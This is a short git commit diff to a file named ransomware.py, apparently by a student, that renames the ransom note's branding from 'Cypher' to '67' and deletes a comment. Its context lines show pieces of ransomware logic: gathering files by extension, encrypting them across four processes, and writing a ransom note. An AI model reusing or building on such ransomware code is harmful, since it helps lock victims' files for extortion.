376ff8f4217361065305b928f2b593974fb25fef
nahil140 <nabekaddour@eleve.st-charles.eu>
2026-01-13 12:54:54 +0000

    67

--- ransomware.py
+++ ransomware.py
@@ -130,7 +130,6 @@ def select_files():
             if file.endswith(tuple(ext)):
                 files_to_enc.append(os.path.join(root, file))
 
-    # Parallelize execution of encryption function over four subprocesses
     pool = Pool(processes=4)
     pool.map(single_arg_encrypt_file, files_to_enc)
 				
@@ -139,17 +138,7 @@ def note():
 	
 	readme = """
 	
-	.d8888b.                    888                       
-	d88P  Y88b                   888                       
-	888    888                   888                       
-	888        888  888 88888b.  88888b.   .d88b.  888d888 
-	888        888  888 888 "88b 888 "88b d8P  Y8b 888P"   
-	888    888 888  888 888  888 888  888 88888888 888     
-	Y88b  d88P Y88b 888 888 d88P 888  888 Y8b.     888     
-	"Y8888P"   "Y88888 88888P"  888  888  "Y8888  888     
-        	        888 888                                
-        	 Y8b d88P 888                                
-        	 "Y88P"  888     
+												67  
 	
 	
 	
@@ -160,7 +149,7 @@ def note():
 
 	Have a nice day, force à toi igo,
 
-	The Cypher Project.""" 	
+	The 67 Project.""" 	
 	
 	# Windows variant
 	# outdir = os.getenv('USERNAME') + "\\Desktop"
